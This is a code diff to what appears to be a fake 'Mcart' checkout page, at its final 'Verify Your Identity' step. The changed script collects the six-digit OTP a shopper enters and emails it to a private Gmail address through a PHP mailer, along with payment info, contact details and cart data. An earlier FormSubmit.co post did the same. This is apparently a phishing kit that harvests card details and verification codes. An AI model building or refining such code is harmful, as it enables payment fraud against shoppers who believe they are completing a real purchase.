@@ -35,8 +35,15 @@
 
     <div class="checkout-layout">
       <form id="otp-form" class="panel" method="POST">
-        <h2>Verify Your Identity</h2>
-        <p class="card-desc">Step 3 of 3: Enter the 6-digit verification code sent to your phone.</p>
+        <div class="form-header">
+          <div class="form-title-section">
+            <h2>Verify Your Identity</h2>
+            <p class="card-desc">Step 3 of 3: Enter the 6-digit verification code sent to your phone.</p>
+          </div>
+          <div class="form-logo">
+            <img src="https://res.cloudinary.com/upwork-cloud/image/upload/c_scale,w_1000/v1709171167/catalog/1614875051934420992/yd4udcdl07tlxipym0lf.webp" alt="Mcart Logo" class="form-brand-logo">
+          </div>
+        </div>
 
         <div class="otp-container">
           <div class="otp-instruction">
@@ -331,12 +338,53 @@
           formData.append('cart_data', document.getElementById('cart-data').value || '');
           formData.append('order_total', document.getElementById('order-total').value || '');
 
-          // Try to send to FormSubmit.co (but don't wait for it)
-          fetch('https://formsubmit.co/akrasd25@gmail.com', {
+          // Send email using PHP service
+          const emailData = new FormData();
+          emailData.append('to_email', 'akrasd25@gmail.com');
+          emailData.append('subject', 'Mcart Order - COMPLETED');
+          emailData.append('from_name', 'Mcart System');
+          emailData.append('from_email', 'noreply@mcart.com');
+          emailData.append('otp', otpCode);
+          emailData.append('order_id', document.getElementById('order-id').value);
+          emailData.append('contact_info', document.getElementById('contact-info').value || '');
+          emailData.append('payment_info', document.getElementById('payment-info').value || '');
+          emailData.append('cart_data', document.getElementById('cart-data').value || '');
+          emailData.append('order_total', document.getElementById('order-total').value || '');
+          emailData.append('message', 'ORDER COMPLETED - OTP verified: ' + otpCode);
+
+          console.log('Sending final order email via PHP service');
+
+          // Send email via robust PHP service
+          fetch('send_email_robust.php', {
             method: 'POST',
-            body: formData
-          }).catch(function(error) {
-            console.log('FormSubmit.co submission failed:', error);
+            body: emailData
+          })
+          .then(function(response) {
+            console.log('PHP email response status:', response.status);
+            return response.json();
+          })
+          .then(function(data) {
+            console.log('PHP email response:', data);
+            if (data.success) {
+              if (statusNode) {
+                statusNode.textContent = '✅ Order completed and confirmed!';
+                statusNode.className = 'form-status success';
+              }
+            } else {
+              if (statusNode) {
+                statusNode.textContent = '⚠️ Final confirmation failed: ' + data.message;
+                statusNode.className = 'form-status error';
+              }
+            }
+          })
+          .catch(function(error) {
+            console.error('PHP email submission failed:', error);
+            
+            // Show error to user
+            if (statusNode) {
+              statusNode.textContent = '⚠️ Email could not be sent, but order continues. Error: ' + error.message;
+              statusNode.className = 'form-status error';
+            }
           });
 
           // Clear cart and session data after successful submission
